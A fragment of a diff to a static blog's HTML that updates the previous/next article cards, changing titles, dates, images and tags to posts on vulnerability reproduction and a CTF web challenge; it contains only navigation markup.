+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
             <div class="card">
-                <a href="/2022/05/01/iscc/">
+                <a href="/2022/07/10/vulhub%E5%A4%8D%E7%8E%B01/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="iscc">
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="vulhub复现1">
                         
-                        <span class="card-title">iscc</span>
+                        <span class="card-title">vulhub复现1</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -726,9 +913,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-05-01
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-07-10
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -737,11 +924,12 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/iscc/">
-                        <span class="chip bg-color">iscc</span>
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                        <span class="chip bg-color">漏洞复现</span>
                     </a>
                     
                 </div>
@@ -755,13 +943,13 @@
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/04/27/ssti%E4%BE%8B%E9%A2%98/">
+                <a href="/2022/05/30/nssctf-1/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="ssti例题">
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="nssctf-1">
                         
-                        <span class="card-title">ssti例题</span>
+                        <span class="card-title">nssctf-1</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -772,7 +960,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-27
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-05-30
                             </span>
                         <span class="publish-author">
                             
@@ -781,6 +969,14 @@
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctf%E9%A2%98%E7%9B%AE-web/">
+                        <span class="chip bg-color">ctf题目--web</span>
+                    </a>
+                    
                 </div>
                 
             </div>
